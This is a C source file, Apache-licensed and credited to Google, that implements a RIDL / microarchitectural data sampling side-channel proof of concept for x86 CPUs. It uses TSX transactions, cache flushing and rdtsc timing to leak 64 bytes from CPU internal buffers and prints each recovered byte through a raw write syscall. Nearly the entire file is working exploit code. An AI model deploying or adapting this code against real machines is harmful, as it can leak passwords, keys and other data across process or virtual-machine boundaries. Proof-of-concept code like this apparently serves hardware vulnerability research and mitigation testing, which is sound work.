/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <immintrin.h>
#include <memory.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <syscall.h>
#include <unistd.h>

#define PAGE_DIV 8
#define CACHELINE (size_t)(4096/PAGE_DIV)
#define MEMSZ (256*CACHELINE)

inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
  unsigned long cycles_high;
  unsigned long cycles_low;
  asm volatile (
      "lfence\n\t"
      "RDTSC\n\t"
      "mov %%rdx, %0\n\t"
      "mov %%rax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low)::
      "rax", "rbx", "rcx", "rdx");
  return (cycles_high << 32) | cycles_low;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
  unsigned long cycles_high;
  unsigned long cycles_low;
  asm volatile(
      "RDTSCP\n\t"
      "mov %%rdx, %0\n\t"
      "mov %%rax, %1\n\t"
      "mfence\n\t"
      : "=r" (cycles_high), "=r" (cycles_low)::
      "rax", "rbx", "rcx", "rdx");
  return (cycles_high << 32) | cycles_low;
}

inline __attribute__((always_inline)) int is_cached(void *ptr1) {
  uint64_t start = 0, end = 0;

  start = rdtsc_begin();
  asm volatile("movq (%0), %%rax\n" : : "c"(ptr1) : "rax"); 
  end = rdtsc_end();

  if (end - start < 100) {
    return 1;
  }
  return 0;
}

inline __attribute__((always_inline)) void ridl_byte(char *probe, unsigned long off, unsigned int *hist) {

  for (volatile unsigned long i = 0; i < MEMSZ; i++) {
    probe[i] = 0x91;
  }

  _mm_mfence();
  for (size_t i = 0; i < 256; i++) {
    _mm_clflush(probe + i * CACHELINE);
  }
  _mm_mfence();

  for (unsigned x = 0; x <= (1u << 18); x++) {
    if (_xbegin() == _XBEGIN_STARTED) {
      asm volatile(
          "movzxb   (%0),%%rbx\n\t"
          "shl    $0x9,%%rbx\n\t"
          "add    %1,%%rbx\n\t"
          "mov    (%%rbx),%%rbx\n\t"
          :
          : "r" (off), "r"(probe)
          : "rbx");
      _xend();
    } else {
      if ((x % (512)) == 0) {
        for (size_t off = 0; off < PAGE_DIV; off++) {
          for (size_t i = off; i < 256; i+=PAGE_DIV) {
            if (i < 2 || i > 254) continue;
            if (is_cached(probe + CACHELINE * i)) {
              hist[i]++;
            }
            _mm_clflush(probe + CACHELINE*i);
          }
        }

        for (size_t i = 0; i < CACHELINE*256; i+=CACHELINE) {
            _mm_clflush(probe + i);
        }
      }
    }
  }
}

inline __attribute__((always_inline)) unsigned char max_char(unsigned int *hist) {
  unsigned char max = 0;
  unsigned int max_val = hist[0];
  for (int c = 1; c < 256; c++) { 
    if (c == 0x91) continue;
    if (hist[c] > max_val) {
      max_val = hist[c];
      max = c;
    }
  }

  return max;
}

void doit(char *probe) {
  for (int off = 0; off < 64; off++) {
    unsigned int hist[256] = {0};
    ridl_byte(probe, off, hist);
    volatile unsigned char c = max_char(hist);
    asm volatile (
        "mov $1, %%rax\n\t"
        "mov $1, %%rdi\n\t"
        "mov %0, %%rsi\n\t"
        "mov $1, %%rdx\n\t"
        "syscall\n\t"
        :: "r"(&c) : "rax", "rdi", "rsi", "rdx", "rcx", "r11"
        );
  }
}

int main() {
  char *probe = mmap(0, MEMSZ, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
  if (probe == MAP_FAILED) {
    err(1, "mmap");
  }

  doit(probe);

  return 0;
}

